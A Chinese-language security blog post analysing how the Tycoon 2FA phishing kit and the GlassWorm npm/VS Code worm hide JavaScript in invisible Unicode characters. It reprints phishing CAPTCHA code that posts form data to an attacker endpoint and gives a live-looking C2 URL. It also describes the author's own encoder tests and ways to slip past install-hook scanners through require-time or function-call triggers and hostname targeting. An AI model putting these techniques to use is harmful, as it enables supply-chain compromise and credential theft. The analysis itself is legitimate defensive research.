---
layout:     post
title:  Tycoon2FA&GlassWorm-Unicode编码的两种落地形态
subtitle:
date:       2026-03-23
author:     Closure
header-img: img/fmq.jpg
catalog: true
tags:

- 安全
---

最近出了挺多unicode编码隐写的东西，Tycoon 2FA在钓鱼页用Hangul填充符编码JS逻辑，GlassWorm用Unicode变体选择符将payload藏进了npm包和VS Code扩展的源码空白的地方，都是两个原理相通，落地场景不同的东西(~~不需要密码学，你拿AI跑几分钟就能出个现成编码器~~

### Tycoon 2FA

https://www.microsoft.com/en-us/security/blog/2026/03/04/inside-tycoon2fa-how-a-leading-aitm-phishing-kit-operated-at-scale/

https://any.run/cybersecurity-blog/tycoon2fa-evasion-analysis/

https://www.bridewell.com/insights/blogs/detail/the-rise-and-fall-of-tycoon-2fa-inside-the-mfa-bypassing-phishing-empire

Tycoon2FA是一个钓鱼平台，去慕名看了他们tg频道快照，120 美元/10天订阅好贵......技术定位是针对微软和gmail绕过的AiTM钓鱼，拿反向代理服务器托管钓鱼页面来截获凭证和cookie


![ ](/img/20260323-1.png)

基础设施由钓鱼落地页&目标检查/cookie收集组件构成，能部署在不同的FQDN上面。按照微软2025年8月的版本来看有七个攻击层面:钓鱼邮件链接 →PDF →PDF深层重定向→Cloudflare Turnstile/自定义CAPTCHA→反机器人检查→ 邮箱验证页面 → 假Microsoft 365登录页
受害者输入密码之后的Tycoon服务器实时转发凭据到合法身份提供商，再合法MFA被透传给受害者，完成MFA后，Tycoon截获Cookie。

他们web管理页面很无脑，包含了模板和域名 托管配置/重定向逻辑管理/交互追踪/Cookie下载/附件文件生成这些，这种UI界面也算是造成了大规模被利用的一种原因之一吧(

Tycoon2FA的CAPTCHA早期版本还是依赖Cloudflare Turnstile，但是Cloudflare可以识别然后ban掉恶意站点，安全团队也能通过识别Turnstile特征元素快速指纹化钓鱼页面，所以Tycoon 2FA先后引入了Google reCAPTCHA和IconCaptcha，最终落地在自定义HTML5 Canvas CAPTCHA和多种方案之间动态轮换

↓ LevelBlue的实现逻辑

```
function generateCaptcha() {
  var canvas = document.getElementById("captchaCanvas");
  var ctx = canvas.getContext("2d");


  var chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
  var captchaText = "";
  for (var i = 0; i < 6; i++) {
    captchaText += chars.charAt(Math.floor(Math.random() * chars.length));
  }


  ctx.fillStyle = "#f0f0f0";
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  for (var i = 0; i < 30; i++) {
    ctx.strokeStyle = "rgba(" +
      Math.random()*255 + "," +
      Math.random()*255 + "," +
      Math.random()*255 + ",0.3)";
    ctx.beginPath();
    ctx.moveTo(Math.random()*canvas.width, Math.random()*canvas.height);
    ctx.lineTo(Math.random()*canvas.width, Math.random()*canvas.height);
    ctx.stroke();
  }


  for (var i = 0; i < captchaText.length; i++) {
    ctx.save();
    ctx.translate(30 + i * 35, 35 + Math.random() * 10);
    ctx.rotate((Math.random() - 0.5) * 0.4);
    ctx.font = (20 + Math.random() * 10) + "px Arial";
    ctx.fillStyle = "rgb(" +
      Math.floor(Math.random()*100) + "," +
      Math.floor(Math.random()*100) + "," +
      Math.floor(Math.random()*100) + ")";
    ctx.fillText(captchaText[i], 0, 0);
    ctx.restore();
  }

  return captchaText;
}


function verifyCaptcha(userInput, expectedText) {
  if (userInput === expectedText) {

    sendFormData();
    fetchNextStageInstructions();
  } else {

    generateCaptcha();
  }
}

function fetchNextStageInstructions() {
  fetch("../attackerEndpoint", { method: "POST", body: formData })
    .then(response => {
      if (response.error || response.unexpected) {
        document.body.innerHTML = atob(decoyPageBase64);
      } else {
        loadPhishingPage(response);
      }
    });
}
```

综上CAPTCHA可以拿来过滤扫描器，googl的URL扫描服务没有办法自动通过CAPTCHA，所以我们自己的恶意页面不会被标记，可以拿来直接延长页面的存活时间。并且如果要分析页面，必须手动通过CAPTCHA才能看到后续内容，这样可以让批量分析变得不可行，最重要的是有它存在反而让页面看起来可信....

### Hangul编码

![ ](/img/20260323-9.png)

它们是字母，所有Unicode将它们归类为Lo(Letter, other)，具有ID_Start和ID_Continue属性，在JSc是合法的标识符字符，可以用来作变量名/参数名/属性名/函数名。

且渲染为零宽度，普通字母有可见字形，这两个填充字符在所有主流浏览器和编辑器中渲染都是没有宽度的，没有字形的；这个组合非常特殊，因为像其他诸如ZWSP U+200B的零宽字符属于Format类别，不具有 ID_Start，不能用作 JS 标识符的首字符。

Tycoon 2FA的落地页用Halfwidth Hangul Filler U+FFA0 代表二进制0，用Hangul Filler U+3164代表二进制1 levelblue，他们将JS代码逐字符转换为二进制表示，再用这两个不可见字符替代0和1

- 假设要编码字母 a：
- 如果要编码 alert(1) :

编码后的字符被拼接为二进制字符串按8位分割为字节，每个字节再转换为对应的字符，最后构出完整的JS代码levelblue

*为什么用Proxy，不能直接eval

直接eval需要显式的解码+执行代码，在源码中会看到明显的eval(decode(...))模式，容易被捕获，Proxy get陷阱将解码逻辑隐藏在属性访问行为中，源码中看到的只是一个属性访问操作，没有显式的eval调用

按照公开逻辑让gemini复现了测试页面，整合在下面了qwq

> 把一段明文JS变成人眼看不到的字符序列，然后嵌入html，编码算法和↑一样，U+FFA0和 U+3164。脚本将payload的每个ASCII字符转换为8位二进制表示，然后逐位替换：二进制0用U+FFA0，二进制1用U+3164代，一段46字符的 alert(...)语句编码后变成360个不可见字符。

>生成的html文件将不可见字符直接写入JS的一个模板字符串常量中，这些字符没有字形在浏览器的查看源代码中这个常量看起来是空的，但是JS引擎完整地保留了它们。

>html复现了Martin Kleppe的Proxy get陷阱执行链，是Tycoon 2F真实钓鱼攻击中原封不动使用的那段。用了JS Proxy 对象的属性访问拦截能力，创建了一个空对象的Proxy，定义了get陷阱，当任何属性被访问时，陷阱函数接收属性名作为参数。然后代码访问这个Proxy的一个属性，属性名是360个不可见Hangul字符。


>属性访问触发的时候，get 陷阱内部执行解码，+("ﾠ" > c)，U+FFA0 的码位值（65440）大于 U+3164 的码位值（12644），所以当 c 是 U+3164（代表二进制 1）时比较结果为 true，转为数字就是 1；当 c 是 U+FFA0（代表二进制 0）时比较结果为 false，转为数字就是0。

>这样每个不可见字符被还原为一个二进制位。每 8 位拼成一个字节（通过正则 /.{8}/g 分组），用 parseInt("0b" + bits, 10) 转回字符码，String.fromCharCode() 转回 ASCII 字符。最终拼接出完整的 JavaScript 代码字符串传给eval执行。

### GlassWorm

https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode

https://www.koi.ai/blog/glassworm-first-self-propagating-worm-using-invisible-code-hits-openvsx-marketplace

接下来是老生常谈的npm包投毒....

- Notable Compromised Repositories on GitHub
- Among the repositories we identified, several belong to well-known projects with meaningful star counts, making them high-value targets for downstream supply chain impact:
- pedronauck/reworm (1,460 stars)
- pedronauck/spacefold (62 stars)
- anomalyco/opencode-bench (56 stars)
- doczjs/docz-plugin-css (39 stars)
- uknfire/theGreatFilter (38 stars)
- sillyva/rpg-schedule (37 stars)
- wasmer-examples/hono-wasmer-starter (8 stars)

![ ](/img/20260323-01.png)

安全公司风险引擎标记了CodeJoy这个VS Code扩展出现可疑行为变更，发起异常网络连接并尝试未经授权地访问凭证，分析发现扩展被植入了一种前所未见的恶意软件，报告原文是"恶意代码是不可见的。不是混淆，不是隐藏在压缩文件中，而是对人眼真正不可见。"

![ ](/img/20260323-2.png)

在被感染的代码中第2行和第7行之间出现了一段巨大的空白，实际上包含了完整的恶意payload

起名GlassWorm，顾名思义，Glasss是不可见Unicode字符让恶意代码在编辑器中像玻璃般透明，Worm指窃取凭证后自动感染更多包和扩展。

GlassWorm用的是Unicode变体选择符和PUA字符隐藏

- 变体选择符 VS1–VS16：U+FE00–U+FE0F
- 变体选择符补充区 VS17–VS256：U+E0100–U+E01EF

这些字符在Unicode标准中被归类为非间距标记，原始用途是作为前序字符的字形变体修饰符（emoji表情样式切换），它们没有字形渲染为零宽度。

当一长串变体选择符附加在一个简单的ASCII字符之后，且没有可逻辑修饰的前序字符时，这在正常文本中极不正常，是很明显的隐写术，但是它们不产生任何视觉输出，所以没有编辑器或者diff工具会标记它们。

[为了方便理解，半人工半AI做了个模拟，放这里了(](https://github.com/DemondeLap1ace/unicode-steganography "为了方便理解，半人工半gemini做了个npm包模拟，放这里了(")

加了六个高级命令:

- --payload — 换一个payload，命令行直接传
- --payload-file — 多行载荷写到文件里，build.py读文件内容编码
- --decode — 逆向提取不可见字符，还原为可读代码打印出来。
- --json --exit-code — JSON给机器读 exit code 1让管线自动失败
- --hex-context — 不可见字符在底层字节的样子
- --yara — 自动生成YARA规则扫描整个文件系统

有对应的pua-npm和hangul-browser，底层原理反正都是不可见Unicode→运行时解码→执行

测试的时候发现一个可以来当启发式规则的，new Function中使用require会报错。原因是require不是全局变量，它是Node模块包装函数的局部参数，new Function执行时脱离了该闭包回到全局作用域，导致requir不可见。

eval在调用位置的词法作用域中执行，继承了完整的模块上下文，Node.js v24把这个收紧了.....对照了GlassWorm的代码发现它们用的是eval，不是一开始我写的new Function，所以拿eval+展开运算符和codePointAt()的组合模式是正常code里面非常非常罕见。

写的时候就意识到这个方案没有任何技术门槛，连基本的密码学都不需要，让任何一个AI写都能实现一个完整的编码器，Martin Kleppe的Hangul是一个字符比较运算 +("ﾠ" > c) 同时完成类型判断和二进制提取，Tycoon 2FA直接从Kleppe的网页上复制代码连变量名都没改.....

搜了一下有六万多个个不可见码位能编码使用，只要项目里面的detect遗漏了任何一个范围，攻击者就可以用那个范围绕过，尝试一个新范围的成本只用一行基址偏移量。

让AI跑的触发是postinstall，其他触发方式感觉更隐蔽点()可以在require触发，解码逻辑放在模块的顶层代码里面，这样任何 require('invisible-utils') 都会执行，还可以学glassworm将解码逻辑放在capitalize函数内部，只有实际调用时才执行。（补在最后了

他们还搞了三层c2，完全不同的通道，就算ban一个也不影响整体。

第一层是solana钱包地址，每5秒查询上面的硬编码，搜索该地址发出的交易，交易的memo字段中嵌入了一个jjson，包含Base64编码的下一阶段下载链接。

第二层是Google Calendar(又是你)，代码中嵌有一个日历事件链接，标题中包含Base64的URL，指向另一个加密payload。

![ ](/img/20260323-3.png)
![ ](/img/20260323-4.png)

aHR0cDovLzIxNy42OS4zLjIxOC9nZXRfem9tYmlfcGF5bG9hZC9xUUQlMkZKb2kzV0NXU2s4Z2dHSGlUdg==

解码后：http://217.69.3.218/get_zombi_payload/qQD%2FJoi3WCWSk8ggGHiTdg==

直接在路径里面告诉大家要把受害者变成僵尸。。。。Google域名信誉所以安全工具不会阻止对calendar.app.google的请求，日历事件可以随时修改内容更新C2地址

第三层是BitTorrent DHT，使用公钥858d53e806734c539b50f15ca72580437ce47ba9查询 BitTorrent DHT网络，检索包含C2 IP地址的JSON数据，通过密码学签名验证确保数据来自攻击者。

![ ](/img/20260323-5.png)

![ ](/img/20260323-6.png)

解码后是一个马，能进行批量凭证窃取和偷加密货币钱包，还附带了隐藏VNC服务器和把受害者机器变成跳板节点，看新闻报道甚至还有利用偷来的凭证自动登录npm/OpenVSX/GitHub账户，在受害者维护的包和扩展中注入相同的恶意代码，然后发布新版本

### 迷思

![ ](/img/20260323-7.png)

Snyk的规则全是全部围绕install钩子设计的，毕竟postinstall是最后一个安全工具能主动触发并观测的环节，之后执行完全取决于用户怎么使用这个包，安全工具没有控制权。

它的检测类似注册中心级别的扫描器，轮询npm的CouchDB复制端点对每个新发布的包做分析，它只能元数据分析&tarball解压，如果有install脚本就在沙箱中执行。

沙箱执行postinstall是因为它知道该执行什么，package写了postinstall: "node lib/setup.js"，沙箱照做就行，如果没有install脚本沙箱就不知道下一步该做什么。

~~(所以为什么不能require一下看看呢~~

理论上沙箱可以在安装后做require来触发模块顶层代码，但是每天的规模太大了，而且很多包的require如果缺少数据库连接/API/指定的操作系统都会失败，还有大量合法的包在require时做初始化工作，如果把require时有网络请求标记为可疑那主流嗲dotenv和sentry类的包全部会被误报。

↑反推一下，包的主版本号小于90、包在在一年后内有更新、包的新版本在对应的GitHub仓库中有标签、避免用 "postinstall": "node ." 就行了(

![ ](/img/20260323-8.png)

试着在之前AI跑的项目上改成require和函数调用了，删了setup.js和postinstall，bootstrap移到index末尾的模块顶层，测试结果是npm install时零输出，node app.js 的require那一行立即触发输出系统信息，然后capitalize slugify正常工作

函数那里bootstrap从顶层移入capitalize函数内部，用 _init() + _initialized标志做延迟单次执行，三个随机变量名每次build不同。

- node test1_require_only.js     → 只 require 不调用
- 结果：module loaded, typeof capitalize: function
- node test2_slugify_only.js     → 只调用 slugify
- 结果：hello-world-2024
- node test3_capitalize.js       → 调用 capitalize
- 结果：[FUNCTION-TRIGGER] Payload executed!

还可以学GlassWorm的毛子 ，检测系统语言，俄语区跳过执行。。。。只在特定locale下触发来地理定向，hostname/username模式匹配，测试结果中hostname的username是我自己的，如果加一个检查只在hostname匹配企业命名规范时触发，就能只打特定的机器(
